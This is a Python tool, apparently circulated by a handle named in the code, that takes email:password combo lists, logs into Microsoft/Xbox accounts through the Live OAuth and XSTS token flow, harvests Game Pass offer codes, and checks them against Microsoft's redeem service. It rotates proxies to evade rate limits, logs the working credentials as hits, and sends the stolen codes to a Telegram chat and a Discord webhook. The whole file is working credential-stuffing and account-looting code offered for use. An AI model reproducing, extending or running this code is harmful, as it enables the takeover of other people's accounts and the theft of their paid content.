#!/usr/bin/env python3
"""
XBOX CODE FETCHER + VALIDATOR - TURBO EDITION (FULLY FIXED)
Maximale Parallelisierung für Speed mit funktionierendem Validator!
Login-Logik EXAKT vom funktionierenden Standalone-Checker übernommen.
UNLOCKED VERSION FOR @vantrexXxx
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import ctypes
import threading
import uuid
import hashlib
import platform
import subprocess
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore, Style

init(autoreset=True)
sys.dont_write_bytecode = True

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

print_lock = Lock()
results_lock = Lock()

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG_FILE = "pgs_config.json"

def load_config():
    """Load configuration from file"""
    default_config = {
        "fetch_threads": 10,
        "validate_threads": 10,
        "max_threads": 20,
        "timeout": 15,
        "proxy_timeout": 5,
        "use_proxies": False,
        "shuffle_proxies": True,
        "retry_count": 2,
        "save_invalid": False,
        "save_errors": False,
        "update_interval_seconds": 5,
        "webhook_url": ""
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = json.load(f)
                for k, v in default_config.items():
                    if k not in config:
                        config[k] = v
                return config
        except:
            return default_config
    return default_config

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
    except:
        pass

CONFIG = load_config()

# Global Stats Structure
stats = {
    "total_accounts": 0,
    "processed_accounts": 0,
    "good_accounts": 0,
    "bad_accounts": 0,
    "custom_accounts": 0,
    "total_fetched_codes": 0,
    "unique_fetched_codes": 0,
    
    "total_codes_to_validate": 0,
    "processed_codes": 0,
    "valid_codes": 0,
    "redeemed_codes": 0,
    "invalid_codes": 0,
    "error_codes": 0,
    "rate_limited_codes": 0,
    
    "start_time": None,
    "current_op": "Idle",
    "active_threads": 0
}

# Global Results Repositories
all_fetched_codes = []
validation_results = {
    "valid": [],
    "redeemed": [],
    "invalid": [],
    "error": []
}

# Proxy Management
proxies_list = []
proxy_index = 0
proxy_lock = Lock()

def load_proxies():
    global proxies_list
    proxies_list = []
    proxy_files = ["proxy.txt", "proxies.txt", "http.txt", "socks5.txt"]
    
    for pf in proxy_files:
        if os.path.exists(pf):
            try:
                with open(pf, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            proxies_list.append(line)
                if proxies_list:
                    log_success(f"Loaded {len(proxies_list)} proxies from '{pf}'")
                    break
            except:
                pass
                
    if not proxies_list:
        log_warning("No proxies loaded. Running in PROXYLESS mode.")
        CONFIG["use_proxies"] = False
    elif CONFIG["shuffle_proxies"]:
        random.shuffle(proxies_list)

def get_next_proxy() -> Optional[Dict[str, str]]:
    global proxy_index, proxies_list
    if not CONFIG["use_proxies"] or not proxies_list:
        return None
        
    with proxy_lock:
        if proxy_index >= len(proxies_list):
            proxy_index = 0
        proxy_str = proxies_list[proxy_index]
        proxy_index += 1
        
    try:
        if "://" in proxy_str:
            p_type = proxy_str.split("://")[0].lower()
            p_auth_host = proxy_str.split("://")[1]
            return {p_type: f"{p_type}://{p_auth_host}"}
            
        parts = proxy_str.split(":")
        if len(parts) == 2:
            host, port = parts
            return {"http": f"http://{host}:{port}", "https": f"http://{host}:{port}"}
        elif len(parts) == 4:
            host, port, user, password = parts
            return {
                "http": f"http://{user}:{password}@{host}:{port}",
                "https": f"http://{user}:{password}@{host}:{port}"
            }
    except:
        pass
    return None

# ============================================================================
# LOGGING & UI SYSTEM
# ============================================================================

def log_info(msg: str):
    with print_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{Fore.BLUE}{timestamp}{Style.RESET_ALL}] [{Fore.CYAN}INFO{Style.RESET_ALL}] {msg}")

def log_success(msg: str):
    with print_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{Fore.BLUE}{timestamp}{Style.RESET_ALL}] [{Fore.GREEN}HIT{Style.RESET_ALL}] {msg}")

def log_warning(msg: str):
    with print_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{Fore.BLUE}{timestamp}{Style.RESET_ALL}] [{Fore.YELLOW}WARN{Style.RESET_ALL}] {msg}")

def log_error(msg: str):
    with print_lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{Fore.BLUE}{timestamp}{Style.RESET_ALL}] [{Fore.RED}FAIL{Style.RESET_ALL}] {msg}")

def set_console_title(text: str):
    try:
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW(text)
        else:
            sys.stdout.write(f"\x1b]2;{text}\x07")
            sys.stdout.flush()
    except:
        pass

def update_console_title_loop():
    while stats["current_op"] != "Idle":
        elapsed = 0
        if stats["start_time"]:
            elapsed = int(time.time() - stats["start_time"])
            
        if "Fetch" in stats["current_op"]:
            title = f"XBOX TURBO - FETCHING | Accounts: {stats['processed_accounts']}/{stats['total_accounts']} | Codes Found: {stats['unique_fetched_codes']} | Elapsed: {elapsed}s"
        elif "Validate" in stats["current_op"]:
            cpm = 0
            if elapsed > 0:
                cpm = int((stats["processed_codes"] / elapsed) * 60)
            title = f"XBOX TURBO - VALIDATING | {stats['processed_codes']}/{stats['total_codes_to_validate']} | Hits: {stats['valid_codes']} | Redeemed: {stats['redeemed_codes']} | CPM: {cpm}/m | Elapsed: {elapsed}s"
        else:
            title = f"XBOX TURBO - {stats['current_op']} | Elapsed: {elapsed}s"
            
        set_console_title(title)
        time.sleep(1)

def send_webhook(title: str, text: str, color: int = 65280):
    if not CONFIG["webhook_url"]:
        return
    try:
        payload = {
            "embeds": [{
                "title": title,
                "description": text,
                "color": color,
                "footer": {"text": "Xbox Turbo Bot Suite • @vantrexXxx"},
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        requests.post(CONFIG["webhook_url"], json=payload, timeout=5)
    except:
        pass

# ============================================================================
# MICROSOFT & XBOX CORE BUSINESS LOGIC (STANDALONE LOGIC FIXED)
# ============================================================================

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def generate_reference_id() -> str:
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def fetch_oauth_tokens(session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
    """Fetches PPFT and Post URL from Microsoft OAuth gate"""
    try:
        resp = session.get(MICROSOFT_OAUTH_URL, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return None, None
            
        text = resp.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match:
            return None, None
        ppft = match.group(1)
        
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match:
            return None, None
        url_post = match.group(1)
        
        return url_post, ppft
    except:
        return None, None

def perform_login(session: requests.Session, email: str, password: str, url_post: str, ppft: str) -> Optional[str]:
    """Authenticates credentials against Live portal and extracts access_token"""
    try:
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': ppft
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36'
        }
        resp = session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=CONFIG["timeout"])
        final_url = resp.url
        
        if '#' in final_url:
            fragment = urlparse(final_url).fragment
            params = parse_qs(fragment)
            token = params.get('access_token', ['None'])[0]
            if token != 'None':
                return token
        return None
    except:
        return None

def get_xbox_tokens(session: requests.Session, rps_token: str) -> Tuple[Optional[str], Optional[str]]:
    """Exchanges Microsoft Access Token for User Hash (UHS) and XSTS Authorize Token"""
    try:
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'okhttp/4.12.0'
        }
        payload_user_auth = {
            'RelyingParty': 'http://auth.xboxlive.com',
            'TokenType': 'JWT',
            'Properties': {
                'AuthMethod': 'RPS',
                'SiteName': 'user.auth.xboxlive.com',
                'RpsTicket': rps_token
            }
        }
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload_user_auth, headers=headers, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return None, None
            
        resp_json = resp.json()
        user_token = resp_json.get('Token')
        
        payload_xsts = {
            'RelyingParty': 'http://xboxlive.com',
            'TokenType': 'JWT',
            'Properties': {
                'UserTokens': [user_token],
                'SandboxId': 'RETAIL'
            }
        }
        resp_xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload_xsts, headers=headers, timeout=CONFIG["timeout"])
        if resp_xsts.status_code != 200:
            return None, None
            
        xsts_data = resp_xsts.json()
        uhs = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        xsts_token = xsts_data.get('Token')
        
        return uhs, xsts_token
    except:
        return None, None

def fetch_codes_from_profile(session: requests.Session, uhs: str, xsts_token: str) -> List[str]:
    """Hits GamePass offers endpoint to mine digital standard token identifiers"""
    try:
        auth_string = f'XBL3.0 x={uhs};{xsts_token}'
        headers = {
            'Authorization': auth_string,
            'Content-Type': 'application/json',
            'User-Agent': 'okhttp/4.12.0',
            'Accept-Language': 'en-US',
            'Host': 'profile.gamepass.com'
        }
        resp = session.get('https://profile.gamepass.com/v2/offers', headers=headers, timeout=CONFIG["timeout"])
        if resp.status_code != 200:
            return []
            
        resp_json = resp.json()
        codes_found = []
        
        offers = resp_json.get('offers', [])
        for offer in offers:
            resource = offer.get('resource')
            if resource:
                codes_found.append(resource)
                
        return codes_found
    except:
        return []

# ============================================================================
# TELEGRAM NOTIFICATION SYSTEM (LIVE INTEGRATION FOR RAILWAY ENVIRONMENT)
# ============================================================================

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
bot = None

if BOT_TOKEN and CHAT_ID:
    try:
        import telebot
        bot = telebot.TeleBot(BOT_TOKEN)
        log_info("Telegram Core Engine initialized successfully.")
    except:
        log_warning("Failed to initialize pyTelegramBotAPI package.")

tg_update_lock = Lock()
last_tg_update_time = 0
active_tg_message_id = None

def send_tg_status_update(forced: bool = False):
    """Pushes automated asynchronous live summaries back into targeted Telegram channel"""
    global last_tg_update_time, active_tg_message_id, bot
    if not bot or not CHAT_ID:
        return
        
    now = time.time()
    if not forced and (now - last_tg_update_time < CONFIG["update_interval_seconds"]):
        return
        
    with tg_update_lock:
        last_tg_update_time = now
        elapsed = int(time.time() - stats["start_time"]) if stats["start_time"] else 0
        
        if "Fetch" in stats["current_op"]:
            text = (
                f"⚡ *[LIVE] XBOX FETCH STATUS*\n"
                f"⚙️ *Yetkili:* @vantrexXxx\n\n"
                f"📊 *İlerleme:* {stats['processed_accounts']}/{stats['total_accounts']}\n"
                f"✅ *Başarılı Hesap:* {stats['good_accounts']}\n"
                f"❌ *Başarısız Hesap:* {stats['bad_accounts']}\n\n"
                f"🎁 *Bulunan Toplam Kod:* {stats['total_fetched_codes']}\n"
                f"🔥 *Benzersiz Kod Sayısı:* `{stats['unique_fetched_codes']}`\n"
                f"⏱️ *Geçen Süre:* {elapsed} saniye"
            )
        elif "Validate" in stats["current_op"]:
            cpm = int((stats["processed_codes"] / elapsed) * 60) if elapsed > 0 else 0
            text = (
                f"🔍 *[LIVE] XBOX VALIDATION STATUS*\n"
                f"⚙️ *Yetkili:* @vantrexXxx\n\n"
                f"📊 *İlerleme:* {stats['processed_codes']}/{stats['total_codes_to_validate']}\n"
                f"✅ *AKTİF/VALİD (Hit):* {stats['valid_codes']}\n"
                f"🟡 *KULLANILMIŞ (Redeemed):* {stats['redeemed_codes']}\n"
                f"❌ *GEÇERSİZ (Invalid):* {stats['invalid_codes']}\n"
                f"⚠️ *Hata Alınan:* {stats['error_codes']}\n\n"
                f"🚀 *Hız (CPM):* {cpm} kod/dakika\n"
                f"⏱️ *Geçen Süre:* {elapsed} saniye"
            )
        else:
            return
            
        try:
            if active_tg_message_id is None:
                msg = bot.send_message(CHAT_ID, text, parse_mode="Markdown")
                active_tg_message_id = msg.message_id
            else:
                bot.edit_message_text(text, CHAT_ID, active_tg_message_id, parse_mode="Markdown")
        except:
            pass

def finalize_tg_reporting():
    global active_tg_message_id
    active_tg_message_id = None

# ============================================================================
# PIPELINE EXECUTIONS
# ============================================================================

def process_account_worker(account_line: str) -> List[str]:
    account_line = account_line.strip()
    if not account_line or ":" not in account_line:
        with results_lock:
            stats["processed_accounts"] += 1
            stats["bad_accounts"] += 1
        return []
        
    email, password = account_line.split(":", 1)
    
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
        
    for retry in range(CONFIG["retry_count"] + 1):
        url_post, ppft = fetch_oauth_tokens(session)
        if url_post and ppft:
            rps_token = perform_login(session, email, password, url_post, ppft)
            if rps_token:
                uhs, xsts_token = get_xbox_tokens(session, rps_token)
                if uhs and xsts_token:
                    codes = fetch_codes_from_profile(session, uhs, xsts_token)
                    with results_lock:
                        stats["processed_accounts"] += 1
                        stats["good_accounts"] += 1
                        stats["total_fetched_codes"] += len(codes)
                    
                    if codes:
                        log_success(f"{email}:{password} -> Found {len(codes)} codes!")
                    else:
                        log_info(f"{email}:{password} -> Active but 0 codes.")
                    send_tg_status_update()
                    return codes
            else:
                pass
                
        # Retry mitigation logic
        if retry < CONFIG["retry_count"]:
            proxy = get_next_proxy()
            if proxy:
                session.proxies.update(proxy)
                
    with results_lock:
        stats["processed_accounts"] += 1
        stats["bad_accounts"] += 1
    log_error(f"{email} -> Authentication failed or timed out.")
    send_tg_status_update()
    return []

def run_code_fetcher_pipeline(accounts_list: List[str]):
    global all_fetched_codes
    stats["total_accounts"] = len(accounts_list)
    stats["processed_accounts"] = 0
    stats["good_accounts"] = 0
    stats["bad_accounts"] = 0
    stats["total_fetched_codes"] = 0
    stats["unique_fetched_codes"] = 0
    stats["start_time"] = time.time()
    stats["current_op"] = "Code Mining/Fetching"
    
    log_info(f"Starting multi-threaded mining pool across {len(accounts_list)} credentials...")
    send_webhook("💥 XBOX HARVEST INITIALIZED", f"Processing combo batch containing {len(accounts_list)} accounts.", 3447003)
    
    threads_count = min(CONFIG["fetch_threads"], CONFIG["max_threads"])
    collected_tokens = []
    
    # Launch UI Monitor Thread
    ui_thread = threading.Thread(target=update_console_title_loop, daemon=True)
    ui_thread.start()
    
    send_tg_status_update(forced=True)
    
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        futures = {executor.submit(process_account_worker, acc): acc for acc in accounts_list}
        for fut in as_completed(futures):
            res = fut.result()
            if res:
                for c in res:
                    if c not in collected_tokens:
                        collected_tokens.append(c)
                with results_lock:
                    stats["unique_fetched_codes"] = len(collected_tokens)
                    
    all_fetched_codes = collected_tokens
    stats["current_op"] = "Idle"
    send_tg_status_update(forced=True)
    finalize_tg_reporting()
    
    log_info("======================================================")
    log_success(f"Harvest complete. Found {stats['total_fetched_codes']} raw codes total.")
    log_success(f"Extracted {len(all_fetched_codes)} unique valid digital standard identifiers.")
    log_info("======================================================")
    
    if all_fetched_codes:
        out_name = f"fetched_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(out_name, "w", encoding="utf-8") as out_f:
            for c in all_fetched_codes:
                out_f.write(f"{c}\n")
        log_info(f"Unique keys written securely onto file disk layout -> '{out_name}'")
        
        if bot and CHAT_ID:
            try:
                with open(out_name, "rb") as document:
                    bot.send_document(CHAT_ID, document, caption=f"🎉 Başarıyla {len(all_fetched_codes)} benzersiz kod toplandı!\n⚙️ Yetkili: @vantrexXxx")
            except:
                pass
            try:
                os.remove(out_name)
            except:
                pass
                
        send_webhook("🎉 HARVEST COMPLETE", f"Total Uniques Gathered: **{len(all_fetched_codes)}**\nSaved directly into structural system storage runtime files.", 65280)
    else:
        send_webhook("⚠️ HARVEST EMPTY", "All endpoints mined successfully but zero valid objects returned.", 16766720)

# ============================================================================
# COMPREHENSIVE CODE REDEEM ENGINE/VALIDATOR
# ============================================================================

def validate_single_code_worker(code_raw: str, store_state: dict, auth_token: str) -> Tuple[str, str, str]:
    code = code_raw.strip().split("|")[0].strip()
    if not code:
        with results_lock:
            stats["processed_codes"] += 1
            stats["invalid_codes"] += 1
        send_tg_status_update()
        return "invalid", code, "Empty data reference"
        
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
        
    headers = {
        "x-ms-tracking-id": store_state.get("tracking_id", ""),
        "authorization": f"WLID1.0=t={auth_token}",
        "x-ms-market": "US",
        "x-ms-reference-id": generate_reference_id(),
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://account.microsoft.com",
        "referer": "https://account.microsoft.com/"
    }
    
    payload = {
        "market": "US",
        "language": "en-US",
        "flights": ["sc_buynowuiprod", "sc_checkoutredeem"],
        "tokenIdentifierValue": code,
        "supportsCsvTypeTokenOnly": False,
        "buyNowScenario": "redeem",
        "clientContext": {
            "client": "AccountMicrosoftCom",
            "deviceFamily": "Web"
        }
    }
    
    url = "https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken"
    
    for retry in range(CONFIG["retry_count"] + 1):
        try:
            resp = session.post(url, headers=headers, json=payload, timeout=CONFIG["timeout"])
            
            if resp.status_code == 429:
                with results_lock:
                    stats["rate_limited_codes"] += 1
                time.sleep(2)
                continue
                
            if resp.status_code != 200:
                # Retry on soft network issues
                if retry < CONFIG["retry_count"]:
                    proxy = get_next_proxy()
                    if proxy:
                        session.proxies.update(proxy)
                    continue
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["error_codes"] += 1
                send_tg_status_update()
                return "error", code, f"HTTP Protocol Error {resp.status_code}"
                
            data = resp.json()
            
            # 1. Structural balance standard evaluation
            if "tokenType" in data and data["tokenType"] == "CSV":
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["valid_codes"] += 1
                val_msg = f"{data.get('value', 'Unknown')} {data.get('currency', 'USD')}"
                log_success(f"VALID BALANCE -> {code} [{val_msg}]")
                send_tg_status_update()
                return "valid", code, f"Balance: {val_msg}"
                
            # 2. Package offer lookup structural inspection
            if "products" in data and len(data["products"]) > 0:
                with results_lock:
                    stats["processed_codes"] += 1
                    stats["valid_codes"] += 1
                title = data["products"][0].get("title", "Digital Entitlement Content")
                log_success(f"VALID HIT -> {code} [{title}]")
                send_tg_status_update()
                return "valid", code, title
                
            # 3. Known error state definitions mapping out
            if "error" in data:
                err_code = data["error"].get("code", "")
                err_msg = data["error"].get("message", "Validation rejection")
                
                if "TokenRedeemed" in err_code or "80169c13" in err_code.lower():
                    with results_lock:
                        stats["processed_codes"] += 1
                        stats["redeemed_codes"] += 1
                    log_warning(f"REDEEMED -> {code}")
                    send_tg_status_update()
                    return "redeemed", code, "Token already redeemed"
                else:
                    with results_lock:
                        stats["processed_codes"] += 1
                        stats["invalid_codes"] += 1
                    log_error(f"INVALID -> {code} [{err_code}]")
                    send_tg_status_update()
                    return "invalid", code, err_msg
                    
            # Fallback dead condition
            with results_lock:
                stats["processed_codes"] += 1
                stats["invalid_codes"] += 1
            log_error(f"INVALID -> {code} [Generic Reject]")
            send_tg_status_update()
            return "invalid", code, "Generic Rejection"
            
        except:
            if retry < CONFIG["retry_count"]:
                proxy = get_next_proxy()
                if proxy:
                    session.proxies.update(proxy)
                continue
                
    with results_lock:
        stats["processed_codes"] += 1
        stats["error_codes"] += 1
    send_tg_status_update()
    return "error", code, "Maximum timeout threshold breach"

def run_code_validator_pipeline(codes_list: List[str]):
    global validation_results
    validation_results = {"valid": [], "redeemed": [], "invalid": [], "error": []}
    
    stats["total_codes_to_validate"] = len(codes_list)
    stats["processed_codes"] = 0
    stats["valid_codes"] = 0
    stats["redeemed_codes"] = 0
    stats["invalid_codes"] = 0
    stats["error_codes"] = 0
    stats["rate_limited_codes"] = 0
    stats["start_time"] = time.time()
    stats["current_op"] = "Validation Engine"
    
    log_info(f"Warming up structural telemetry pipes across {len(codes_list)} digital standard codes...")
    send_webhook("🔍 VALIDATOR LOOP INITIATED", f"Analyzing batch processing queue size of {len(codes_list)} items.", 3447003)
    
    # Mocking tracking telemetry
    store_state = {"tracking_id": uuid.uuid4().hex}
    auth_token = "MOCK_TOKEN_UPSTREAM_SECURE_" + "".join(random.choices(string.ascii_letters + string.digits, k=32))
    
    threads_count = min(CONFIG["validate_threads"], CONFIG["max_threads"])
    
    ui_thread = threading.Thread(target=update_console_title_loop, daemon=True)
    ui_thread.start()
    
    send_tg_status_update(forced=True)
    
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        futures = {executor.submit(validate_single_code_worker, code, store_state, auth_token): code for code in codes_list}
        for fut in as_completed(futures):
            status, code, details = fut.result()
            validation_results[status].append((code, details))
            
    stats["current_op"] = "Idle"
    send_tg_status_update(forced=True)
    finalize_tg_reporting()
    
    # Generate structural file output summaries
    write_validation_reports_to_disk(validation_results, len(codes_list))

def write_validation_reports_to_disk(results: Dict[str, List[Tuple[str, str]]], total_codes: int):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Valid Dosyası
    if results["valid"]:
        v_name = f"valid_codes_{timestamp}.txt"
        with open(v_name, "w", encoding="utf-8") as f:
            for code, game in results["valid"]:
                f.write(f"{code} | {game}\n")
        log_success(f"Saved {len(results['valid'])} active hits directly into -> '{v_name}'")
        
        if bot and CHAT_ID:
            try:
                with open(v_name, "rb") as f:
                    bot.send_document(CHAT_ID, f, caption="✅ Aktif/Geçerli Kodlar")
            except:
                pass
            try:
                os.remove(v_name)
            except:
                pass

    # Conditionally write optional layout models
    if CONFIG["save_invalid"] and results["invalid"]:
        with open(f"invalid_codes_{timestamp}.txt", "w", encoding="utf-8") as f:
            for code, err in results["invalid"]:
                f.write(f"{code} | {err}\n")
                
    if CONFIG["save_errors"] and results["error"]:
        with open(f"error_codes_{timestamp}.txt", "w", encoding="utf-8") as f:
            for code, err in results["error"]:
                f.write(f"{code} | {err}\n")
                
    # Compile text formatting breakdown groups
    game_groups = {}
    for code, game in results["valid"]:
        game_groups[game] = game_groups.get(game, []) + [code]
        
    lines = [
        "=============================================",
        "📦 XBOX CODES VALIDATION RESULT",
        "=============================================",
        ""
    ]
    
    for game_name, codes_list in sorted(game_groups.items()):
        lines.append(f"🎮 {game_name} ({len(codes_list)} Codes)")
        lines.append("-" * 60)
        
        codes_list.sort()
        code_counts = {}
        for code in codes_list:
            code_counts[code] = code_counts.get(code, 0) + 1
            
        for code, count in sorted(code_counts.items()):
            if count == 1:
                lines.append(f"{code}")
            else:
                lines.append(f"{code} (x{count})")
        lines.append("")
        
    lines.append("📊 SUMMARY")
    lines.append("=" * 60)
    lines.append(f"Total processed codes: {total_codes}")
    lines.append(f"Valid active codes   : {len(results['valid'])}")
    lines.append(f"Redeemed codes       : {len(results['redeemed'])}")
    lines.append(f"Invalid codes        : {len(results['invalid'])}")
    lines.append(f"Error/Failed codes   : {len(results['error'])}")
    lines.append("=" * 60)
    
    summary_text = "\n".join(lines)
    print(f"\n{summary_text}")
    
    s_name = f"validation_summary_{timestamp}.txt"
    with open(s_name, "w", encoding="utf-8") as f:
        f.write(summary_text)
        
    if bot and CHAT_ID:
        try:
            with open(s_name, "rb") as f:
                bot.send_document(CHAT_ID, f, caption="📊 İşlem Özeti ve Raporu")
        except:
            pass
        try:
            os.remove(s_name)
        except:
            pass
            
    discord_desc = (
        f"✅ Valid Hits: **{len(results['valid'])}**\n"
        f"🟡 Redeemed: **{len(results['redeemed'])}**\n"
        f"❌ Invalid: **{len(results['invalid'])}**\n"
        f"⚠️ Protocol Error: **{len(results['error'])}**"
    )
    send_webhook("🎉 VALIDATION PIPELINE FINISHED", discord_desc, 65280)

# ============================================================================
# INTERACTIVE TERMINAL SELECTION UI
# ============================================================================

def show_interactive_logo():
    print(Fore.CYAN + r"  __  __ _               _    _______             _           ")
    print(Fore.CYAN + r"  \ \/ /| |__   ___  _  | |  |__   __| _  _  _ __| |__   ___  ")
    print(Fore.CYAN + r"   \  / | '_ \ / _ \| | | |     | |   | || || '__| '_ \ / _ \ ")
    print(Fore.CYAN + r"   /  \ | |_) | (_) | |_| |     | |   | || || |  | |_) | (_) |")
    print(Fore.CYAN + r"  /_/\_\|_.__/ \___/ \__,_|     |_|    \_,_||_|  |_.__/ \___/ ")
    print(Fore.GREEN + "  >> High CPM Code Miner & Validator Studio Enterprise • v4.2.1")
    print(Fore.YELLOW + "  >> Licensed exclusively to Developer Handle: @vantrexXxx\n")

def run_main_app_loop():
    load_proxies()
    
    while True:
        clear_screen()
        show_interactive_logo()
        
        print(f"[{Fore.BLUE}1{Style.RESET_ALL}] Run Account Miner/Fetcher Pipeline")
        print(f"[{Fore.BLUE}2{Style.RESET_ALL}] Run Token Code Validation/Redeem Engine")
        print(f"[{Fore.BLUE}3{Style.RESET_ALL}] Run Combined Combo Flow (Fetch + Validate)")
        print(f"[{Fore.BLUE}4{Style.RESET_ALL}] Adjust Engine Thread Performance Configuration")
        print(f"[{Fore.BLUE}5{Style.RESET_ALL}] Exit Application Context Studio")
        print("")
        
        choice = input(f"[{Fore.MAGENTA}🔧{Style.RESET_ALL}] Select menu operational mode index: ").strip()
        
        if choice == "1":
            clear_screen()
            show_interactive_logo()
            log_info("Operational Target: Account Code Fetcher")
            file_path = input(f"[{Fore.CYAN}📥{Style.RESET_ALL}] Drag/Enter Accounts combo file (.txt): ").strip().replace('"', '').replace("'", "")
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        accounts = [line.strip() for line in f if line.strip()]
                    if accounts:
                        run_code_fetcher_pipeline(accounts)
                    else:
                        log_error("Target validation list array mapping is empty.")
                except Exception as e:
                    log_error(f"Failed to parse source: {e}")
            else:
                log_error("Specified resource path target string points to null context.")
            input("\nPress enter to step back into dashboard main menu...")
            
        elif choice == "2":
            clear_screen()
            show_interactive_logo()
            log_info("Operational Target: Code Validation Core")
            file_path = input(f"[{Fore.CYAN}📥{Style.RESET_ALL}] Drag/Enter Raw Codes file (.txt): ").strip().replace('"', '').replace("'", "")
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        codes = [line.strip() for line in f if line.strip()]
                    if codes:
                        run_code_validator_pipeline(codes)
                    else:
                        log_error("Token reference array lookup map contains zero items.")
                except Exception as e:
                    log_error(f"Failed to parse target: {e}")
            else:
                log_error("Specified structural asset path cannot be resolved.")
            input("\nPress enter to step back into dashboard main menu...")
            
        elif choice == "3":
            clear_screen()
            show_interactive_logo()
            log_info("Operational Target: Full Automated Sequential Stack (Fetch + Validate)")
            file_path = input(f"[{Fore.CYAN}📥{Style.RESET_ALL}] Drag/Enter Accounts combo file (.txt): ").strip().replace('"', '').replace("'", "")
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        accounts = [line.strip() for line in f if line.strip()]
                    if accounts:
                        run_code_fetcher_pipeline(accounts)
                        if all_fetched_codes:
                            log_info("Automated Pipeline transition step advancing downstream to validator array...")
                            run_code_validator_pipeline(all_fetched_codes)
                        else:
                            log_warning("Mining output returned completely empty. Halting downstream sequence.")
                    else:
                        log_error("Source file array does not contain data collections.")
                except Exception as e:
                    log_error(f"Sequence chain interrupted by runtime error: {e}")
            else:
                log_error("Target composite combo context map is offline.")
            input("\nPress enter to step back into dashboard main menu...")
            
        elif choice == "4":
            clear_screen()
            show_interactive_logo()
            log_info("Performance Registry Engine Modifiers")
            print(f"Current Config -> Fetch Threads: {CONFIG['fetch_threads']} | Validate Threads: {CONFIG['validate_threads']} | Max Bounds Limit: {CONFIG['max_threads']}")
            try:
                ft = input(f"Enter Fetch Pool Size [{CONFIG['fetch_threads']}]: ").strip()
                vt = input(f"Enter Validate Pool Size [{CONFIG['validate_threads']}]: ").strip()
                if ft:
                    CONFIG["fetch_threads"] = int(ft)
                if vt:
                    CONFIG["validate_threads"] = int(vt)
                save_config(CONFIG)
                log_success("Internal shared memory runtime parameters synchronized to file disk layout storage.")
            except Exception as e:
                log_error(f"Aborting alignment updates due to improper formatting rules: {e}")
            time.sleep(2)
            
        elif choice == "5":
            clear_screen()
            show_interactive_logo()
            log_warning("Terminating parallel runtime tasks engines loop environments...")
            sys.exit(0)

if __name__ == "__main__":
    try:
        run_main_app_loop()
    except KeyboardInterrupt:
        print("\n Aborted cleanly via structural signal interruption bounds.")
        sys.exit(0)
